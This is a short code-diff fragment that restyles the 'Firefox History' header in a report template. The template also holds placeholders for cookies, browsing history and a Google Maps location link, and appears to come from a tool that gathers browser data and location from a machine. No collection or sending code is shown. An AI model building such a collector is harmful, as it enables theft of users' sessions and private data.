@@ -155,7 +155,7 @@ Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info[
 
 {cookies}
 
------------ Firefox History ------------
+----------- 𝐅𝐢𝐫𝐞𝐟𝐨𝐱 𝐇𝐢𝐬𝐭𝐨𝐫𝐲 ------------
 
 {places}
 
